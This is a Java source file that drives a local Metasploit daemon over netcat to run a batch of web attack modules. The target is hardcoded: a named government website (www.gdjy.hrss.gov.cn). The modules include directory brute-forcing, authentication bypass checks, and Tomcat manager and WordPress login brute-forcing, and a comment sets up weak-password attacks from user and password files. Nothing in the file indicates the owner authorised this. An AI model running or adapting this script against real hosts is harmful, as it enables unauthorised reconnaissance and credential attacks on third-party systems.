package com.mtx.xiatian.hacker.metasploit;

import java.io.InputStream;
import java.io.OutputStream;

/**
 * <pre>
 * load msfd
 * msfd -a 127.0.0.1 -p 2323
 * nc 127.0.0.1 2323
 * 渗透测试框架
 * </pre>
 * @author xiatian
 *
 */
public class Metasploit extends QueryMSF4
{
	
	public Metasploit()
	{
		super();
	}
	/**
	 * @param out 接受命令输出
	 * @param cmdInput 交互命令输入
	 * @param arg 命令参数
	 */
	public  void getCmdResult(OutputStream out,  IGetInputMSFCmd iCbk, String... arg)
	{
		OutputStream outCmd = null;
		Process p = null;
		try
		{
			Runtime rt = Runtime.getRuntime();
			// rt.
			if(null == p)
				p = rt.exec(arg);
			outCmd = p.getOutputStream();
			String cmd = null;
			InputStream in = p.getInputStream();
			while(null != (cmd = iCbk.getCmd()))
			{
				outCmd.write(cmd.getBytes());
				outCmd.flush();
				// 正常命令输出
				OutputStream o = iCbk.getOutputStream();
				if(null == o)o = out;
				new Thread(new MetasploitRest(in, o)).start();
				// 错误消息
				new Thread(new MetasploitRest(p.getErrorStream(), out)).start();
			}
			
			p.waitFor();
			in.close();
			System.out.println("Ok");
		} catch (Exception e)
		{
			e.printStackTrace();
		} finally
		{
//			
//			try
//			{
//				if (null != out)
//				{
//					out.close();
//				}
//			} catch (Exception e)
//			{
//				e.printStackTrace();
//			}
			if (null != p)
				p.destroy();
		}
	}

	/**
	 * @param args
	 */
	public static void main(String[] args)
	{
		final String server = "www.gdjy.hrss.gov.cn";
		final  String port = "80";
		OutputStream out = System.out;
		// /bin/stty raw -echo <&2
		//  bin/stty raw -echo
		// stty cbreak -echo <&2
		// stty: stdin isn't a terminal
		// System.out;
				new Metasploit().getCmdResult(out, 
						new IGetInputMSFCmd(){
					        private int i = 0;
                            public String getCmd()
                            {
                            	   if(0 < i++)return null;
                            		StringBuffer buf = new StringBuffer(); 
                            		
                            		String []md = {
                            				"use auxiliary/scanner/http/cert",
                            				"use auxiliary/scanner/http/dir_listing",
                            				"use auxiliary/scanner/http/dir_scanner",
                            				"use auxiliary/scanner/http/dir_webdav_unicode_bypass",
                            				"use auxiliary/scanner/http/enum_delicious",
                            				"use auxiliary/scanner/http/enum_wayback",
                            				"use auxiliary/scanner/http/files_dir",
                            				"use auxiliary/scanner/http/http_login",
                            				"use auxiliary/scanner/http/open_proxy",
                            				"use auxiliary/scanner/http/options",
                            				"use auxiliary/scanner/http/robots_txt",
                            				"use auxiliary/scanner/http/ssl",
                            				"use auxiliary/scanner/http/http_version",
                            				"use auxiliary/scanner/http/tomcat_mgr_login",
                            				"use auxiliary/scanner/http/verb_auth_bypass",
                            				"use auxiliary/scanner/http/webdav_scanner",
                            				"use auxiliary/scanner/http/webdav_website_content",
                            				/**<pre>
                            				 * 弱口令扫描
                            				 * set URI /wordpress/wp-login.php
                            				 * set PASS_FILE /tmp/passes.txt
                            				 * set USER_FILE /tmp/users.txt
                            				 * </pre>
                            				 */
                            				"use auxiliary/scanner/http/wordpress_login_enum"
                            				};
                            		String []a =
                            			{
                            				"set RHOSTS " + server,
                            				"set THREADS 25",
                            				"set DOMAIN " + server,
//                            				"set VERBOSE false",
                            				"set RPORT " + port,
                            				"run",
                            				"back"
                            			};
                            		try
                            		{
                            			buf.append("workspace gszb\r\n");
                            			for (String mdT : md)
                            			{
                            				buf.append(mdT + "\r\n");
                            				for (String mdTn : a)
                            				{
                            					buf.append(mdTn + "\r\n");
                            				}
                            			}
                            			buf.append("exit\r\n");
//                            			cmdInput.flush();
                            		} catch (Exception e)
                            		{
                            			e.printStackTrace();
                            		}
	                            return buf.toString();
                            }
                            public OutputStream getOutputStream()
                            {
	                            return System.out;
                            }
					
				},
						"/usr/bin/nc",
						"127.0.0.1",
						"2323"
//						"/Users/xiatian/.rvm/rubies/ruby-2.1.6/bin/ruby",
//						"/opt/metasploit-framework/bin/msfconsole"
						);
	}

}
